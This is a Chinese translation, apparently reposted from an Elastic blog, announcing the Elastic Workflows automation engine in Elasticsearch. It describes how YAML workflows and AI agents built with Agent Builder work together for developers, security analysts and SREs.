code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>作者：来自 Elastic <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fblog%2Fauthor%2Fsumana-mannem" title="https://www.elastic.co/blog/author/sumana-mannem" target="_blank" ref="nofollow noopener noreferrer">Sumana Mannem</a> <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fblog%2Fauthor%2Fjames-spiteri" title="https://www.elastic.co/blog/author/james-spiteri" target="_blank" ref="nofollow noopener noreferrer">James Spiteri</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b5279027dfa741229bacec3c5a212edb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890918&amp;x-signature=ZH%2BOxWyxI2HICvyGhK4jBMY9QIM%3D" alt="" loading="lazy"/></p>
<p>在 Elasticsearch 中原生统一脚本化自动化和 AI agents。消除集成，直接对你的数据采取行动。</p>
<p>今天，我们正式推出 Elastic Workflows，这是直接内置在 Elasticsearch 中的自动化引擎。Workflows 为简单任务提供可靠的脚本化自动化，并为需要推理的复杂问题提供由 AI 驱动的自动化。</p>
<p>Elastic Workflows 现已以 技术预览 形式提供。</p>
<h2 data-id="heading-0">挑战：数据孤岛和被迫的权衡</h2>
<p>组织需要自动化来跟上当今数字环境的复杂性。但大多数自动化解决方案都存在两个主要限制。</p>
<ol>
<li><strong>自动化通常与运行数据分离</strong>。这意味着团队必须构建并维护集成，才能为自动化提供所需的上下文。数据必须在系统之间导出、同步或查询。凭证需要单独管理。当上游发生变化时，集成就会中断。维护这些集成会增加不必要的工作量。</li>
<li><strong>团队还面临可靠性与推理能力之间的权衡</strong>。传统自动化可以可预测地处理已定义的任务 —— 每次都以相同方式运行，这正是成熟流程所需要的。但当遇到意外情况时，它无法适应。没有判断，没有解释，只有预定义逻辑。</li>
</ol>
<p>由 AI 驱动的工具承诺填补这一空白。它们可以在没有明确指令的情况下对模糊情况进行推理、权衡选项并建议下一步。但它们往往缺乏关键业务流程所需的精度和可预测性。而且其中大多数距离你的数据更远，又增加了一层需要管理的集成。</p>
<p>直到现在，组织要么在这些方法之间做出选择，要么尝试通过中间件和自定义代码将它们拼接在一起。Elastic Workflows 通过在单一系统中同时提供这两种能力，消除了这种选择。</p>
<h2 data-id="heading-1">Elastic Workflows：数据、上下文和行动统一</h2>
<p>Elastic Workflows 通过将自动化引擎直接带到你数据所在的位置来解决这些问题。无需导出管道、无需中间件，也无需管理单独的安全模型。当工作流需要上下文时，它已经在那里。</p>
<p>工作流使用 YAML 定义，既足够简单，便于进行版本控制和审查，又足够有表现力，能够处理真实的运维逻辑。它们由内置引擎执行，该引擎为企业级可靠性和规模而设计。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/28b43872a29b4c83b9e99186eabd8311~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890918&amp;x-signature=7pLBwlqfDLcftZUwj0shSX4U6Ks%3D" alt="" loading="lazy"/></p>
<p>工作流是完全可组合且事件驱动的。它们可以响应 Elasticsearch 中数据的变化、通过 webhook 接收来自外部 system 的事件，或响应由用户发起的操作。你可以将工作流串联起来、进行嵌套，或将它们暴露为可被其他 system 调用的 tool。</p>
<p>在运行后，工作流会连接到你组织已经使用的外部 system，包括云提供商、服务台、消息平台和身份提供商。但 Elasticsearch 始终处于中心位置，因此工作流中的每一步都可以访问你环境的完整上下文。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/553788a38541408a93276dbea4ebcb83~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890918&amp;x-signature=oHHiWA7B6H9%2B6ZC8YUBczI8c%2B%2F8%3D" alt="" loading="lazy"/></p>
<p>结果是一个更简单的架构，具有更少的移动部件，并且执行更快，因为获取基础上下文时不需要往返外部 system。同时，可出问题的地方也更少，因为你不再维护一张复杂的集成网络。</p>
<h2 data-id="heading-2">用于智能自动化的 workflows 和 agents</h2>
<p>在 Elasticsearch 上将自动化和 AI 统一的架构，使一件一直很难实现的事情成为可能：在同一个流程中，将可预测执行的可靠性与 AI 推理的灵活性结合起来。</p>
<p>它的工作方式是这样的。workflow 负责处理流程中结构化的部分 —— 每次都应该以相同方式运行的步骤。当 workflow 运行到需要判断的节点时，它可以调用一个 AI agent 来分析可用的上下文并决定下一步该怎么做。agent 基于数据进行推理，做出决策，并返回结果。然后 workflow 根据这个输入继续执行。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/23f567a8799d4472a3f6de53f228e37b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890918&amp;x-signature=8xmin%2BdvkKAeD%2BBCJuRCBfjhczw%3D" alt="" loading="lazy"/></p>
<p><strong>这种集成是双向的</strong>。workflows 可以在更大的流程中把 agents 作为智能步骤来调用。而 agents 也可以把 workflows 当作 tools 来调用，从而具备采取具体行动的能力 —— 不只是生成文本，而是真正在你组织运行的各个 系统 中执行操作。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/679fcbed492b448badb8677b9297c824~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890918&amp;x-signature=T6vkc48i1PdbjJ7YAq1NRqpvaTA%3D" alt="" loading="lazy"/></p>
<p>Elastic Workflows 通过与 <a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F153720860" title="https://elasticstack.blog.csdn.net/article/details/153720860" target="_blank" ref="nofollow noopener noreferrer">Elastic Agent Builder</a> 的集成获得其 agentic 能力。Agent Builder 是 Elasticsearch 中用于创建自定义 AI agents 的原生能力。使用 Agent Builder 构建的 agents 可以访问与 workflows 相同的数据和上下文，这意味着它们可以做出更好的决策。并且由于 workflows 和 agents 都运行在同一平台上，推理与执行之间不存在集成断层。</p>
<p>与标准 AI 工具通常只生成建议不同，Elastic Workflows 使 agents 能够采取行动，例如重启服务、更新记录、发送通知或触发另一个 workflow。</p>
<h2 data-id="heading-3">为构建 agents 的开发者</h2>
<p>AI 的进步使开发者能够构建比以前强大得多的 agents，从而自动化更多任务。agents 不再只是用于聊天；它们现在可以自行做出决策并采取行动。然而，许多 agent 构建框架要求大语言模型（ LLMs ）规划和管理自动化的每一个步骤。虽然 AI 擅长推理，但它缺乏业务通常需要的、已定义动作所具备的可靠性。</p>
<p>Workflows 可以通过 MCP 作为 tools 提供给 agent，从而弥补这一差距。Workflows 是 agents 的 “手”，让 agents 能够以可靠的方式与 各种系统 交互，执行操作并收集信息。</p>
<p>Workflows 帮助开发者将复杂流程转化为可预测、可复用的 tools，用于信息收集和执行操作。例如，构建 agent 应用通常需要通过运行符合公司标准的内部和外部系统流程来获取信息。Workflows 通过将复杂流程转化为可预测、可复用的动作来解决这一问题，例如集成企业数据、调用服务、关联信号以及更新记录。这简化了多种搜索和自动化任务，如客户支持分流、内容上传和业务逻辑自动化。它使基于 Elasticsearch 构建的应用能够智能地响应不清晰的请求，同时由 Workflows 提供支撑这些决策所需的可靠执行能力。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e2f716cd7181437abebcbd3ce5c39d8a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890918&amp;x-signature=sjNzSSgKoOT907LRhDFA0isca%2BE%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-4">为安全分析师</h2>
<p>安全分析师需要处理源源不断的告警，而大量初始分流工作都遵循可预测的模式：为告警补充上下文、检查相关活动、拉取资产和身份信息、更新案件，并通知合适的人员。这正是自动化应该处理的工作类型。</p>
<p>Workflows 让安全团队能够以完全的控制力和可预测性将这些流程编码化。常规步骤始终会自动且一致地执行。</p>
<p>但调查并不总是常规的。有时告警不符合任何已知模式。有时攻击者采用了新的手法。在这些情况下，分析师通常需要从零开始，手动收集日志、追踪用户行为、在多个系统之间关联信号，并形成对事件经过的假设。</p>
<p>这正是 workflows 与 agents 结合改变局面的地方。分析师不再从一张空白屏幕开始，而是由 agent 先完成早期准备工作：审查证据、识别异常模式、检查预期的控制是否到位，并建议哪些线索值得继续深入。workflow 保持整体流程的结构化和可审计性，而 agent 负责处理不确定性。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2e35d61821e443e2ac7e032f1aebcf46~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890918&amp;x-signature=rxX1ohxTdc14E4sO2DeG5T63AtE%3D" alt="" loading="lazy"/></p>
<p>分析师仍然保持控制权，但起点更高 —— 已经组装好上下文，并且有可供评估的初始假设，而不是从零开始构建。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/290f4a5525d44d48a791a0ae2676e0ac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890918&amp;x-signature=WDHESwlh8PdMDErBlZwyN%2FDAA88%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-5">对于 SREs</h2>
<p>运维团队大量自动化：健康检查、容量决策、告警路由和修复手册。这些流程在已知模式下保持服务平稳运行。</p>
<p>但并非每个事件都有模式。复杂的性能下降、意外回归和级联故障 —— 这些情况很少有明确的操作手册。操作人员通常必须从零开始调查，跨仪表板和工具关联数据，以弄清实际发生了什么。</p>
<p>使用 workflows 和 agents，调查可以更快开始。一个可以访问你的日志、指标和 trace 的 agent 可以扫描最近部署，识别关联异常，并提出最可能的解释。操作人员不必手动组装上下文，而是从一个假设和支持证据开始。</p>
<p>如果假设成立，workflow 可以继续执行修复操作，如回滚变更、扩展服务或调整配置。agent 提供判断，workflow 提供执行。操作人员保持在环中，批准关键决策并在需要时干预。</p>
<p>结果是在不放弃监督或控制的情况下，更快地解决问题。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b230b1c9a88646e78685c34444516d54~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890918&amp;x-signature=FBxxP4I7I2VtTEM6U4pxJuoA9HQ%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-6">开始使用 Elastic Workflows</h2>
<p>Elastic Workflows 现已作为技术预览提供。你可以从 <a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.elastic.co%2Fregistration" title="https://cloud.elastic.co/registration" target="_blank" ref="nofollow noopener noreferrer">Elastic Cloud 试用</a>开始，并查看<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Fexplore-analyze%2Fworkflows" title="https://www.elastic.co/docs/explore-analyze/workflows" target="_blank" ref="nofollow noopener noreferrer">文档</a>。</p>
<p>我们正在持续构建预制 workflows 和 agent 集成，以帮助团队自动化更多工作。如果你一直在寻找一种方法，将自动化更贴近你的数据，同时不牺牲可靠性或灵活性，这是一个很好的起点。</p>
<p>如需更深入的技术细节，请参阅 Workflows<a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F157726149" title="https://elasticstack.blog.csdn.net/article/details/157726149" target="_blank" ref="nofollow noopener noreferrer">技术博客</a>。</p>
<p><em>本文中描述的任何功能或特性的发布和时间完全由 Elastic 自行决定。任何当前不可用的功能可能无法按时提供，甚至可能永远不会提供。</em></p>
<p><em>在本文中，我们可能使用或提及了第三方生成式 AI 工具，这些工具由各自所有者拥有和运营。Elastic 对这些第三方工具没有任何控制，也不对其内容、操作或使用承担责任，也不对你使用这些工具可能产生的任何损失或损害负责。请在使用包含个人、敏感或机密信息的 AI 工具时谨慎操作。你提交的任何数据可能会用于 AI 训练或其他用途。无法保证你提供的信息会被安全或保密地保存。在使用任何生成式 AI 工具之前，你应了解其隐私政策和使用条款。</em></p>
<p><em>Elastic、Elasticsearch 及相关商标是 Elasticsearch B.V. 在美国及其他国家的商标、徽标或注册商标。所有其他公司和产品名称均为其各自所有者的商标、徽标或注册商标。</em></p>
<p>原文：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fsearch-labs%2Fblog%2Felastic-workflows-automation" title="https://www.elastic.co/search-labs/blog/elastic-workflows-automation" target="_blank" ref="nofollow noopener noreferrer">www.elastic.co/search-labs…</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>